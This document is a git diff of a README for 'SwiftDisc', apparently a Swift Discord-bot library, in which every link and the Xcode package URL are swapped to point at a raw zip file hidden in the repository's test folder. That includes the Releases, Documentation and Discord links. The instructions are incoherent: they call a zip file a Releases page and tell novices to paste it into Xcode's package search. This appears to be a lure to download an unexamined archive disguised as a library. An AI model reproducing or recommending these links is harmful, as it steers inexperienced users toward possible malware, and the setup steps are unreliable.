@@ -7,10 +7,10 @@ SwiftDisc is a powerful tool for creating Discord bots using Swift. It works sea
 To start using SwiftDisc, follow the easy steps below. We designed this guide for everyone, including those with no programming experience.
 
 ## 📥 Download SwiftDisc
-[![Download Latest Release](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
+[![Download Latest Release](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
 
 Head over to our Releases page to download the latest version of SwiftDisc:
-[Download SwiftDisc](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
+[Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
 
 ## 🛠️ System Requirements
 - macOS 10.15 or later for development.
@@ -18,7 +18,7 @@ Head over to our Releases page to download the latest version of SwiftDisc:
 - Basic knowledge of how to install applications on your Mac.
 
 ## 📂 Installation Steps
-1. **Visit the Releases Page**: Click the link to go to the SwiftDisc Releases page: [Download SwiftDisc](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip).
+1. **Visit the Releases Page**: Click the link to go to the SwiftDisc Releases page: [Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip).
    
 2. **Download the Latest Release**: On the Releases page, look for the latest version of SwiftDisc. Click the download link for the file suitable for your operating system.
 
@@ -31,7 +31,7 @@ Head over to our Releases page to download the latest version of SwiftDisc:
 6. **Add SwiftDisc to Your Project**:
    - In the Xcode project settings, navigate to the “Package Dependencies” section.
    - Click on the "+" button to add a new package.
-   - Paste the URL `https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip` into the search box.
+   - Paste the URL `https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip` into the search box.
    - Select the latest version, and then click "Add Package".
 
 7. **Start Building Your Bot**: Follow the included documentation to set up your bot. You can access it in the SwiftDisc folder you downloaded earlier.
@@ -60,11 +60,11 @@ For assistance, join our Discord community. You can find the link to our Discord
 SwiftDisc is MIT licensed, allowing you to use, modify, and share the software freely.
 
 ## 🔗 Useful Links
-- [SwiftDisc Releases](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
-- [Documentation](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
-- [Join Our Discord](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
+- [SwiftDisc Releases](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
+- [Documentation](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
+- [Join Our Discord](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
 
 ## 🕹️ Start Building
 With your environment set up, you are ready to dive into bot development. Remember, the documentation provides numerous examples and use cases. Happy coding!
 
-Make sure to check the Releases page regularly for updates and new features: [Download SwiftDisc](https://raw.githubusercontent.com/bcl2025/SwiftDisc/main/Sources/SwiftDisc/Voice/SwiftDisc_2.2.zip)
+Make sure to check the Releases page regularly for updates and new features: [Download SwiftDisc](https://github.com/bcl2025/SwiftDisc/raw/refs/heads/main/Tests/SwiftDiscTests/Swift_Disc_squin.zip)
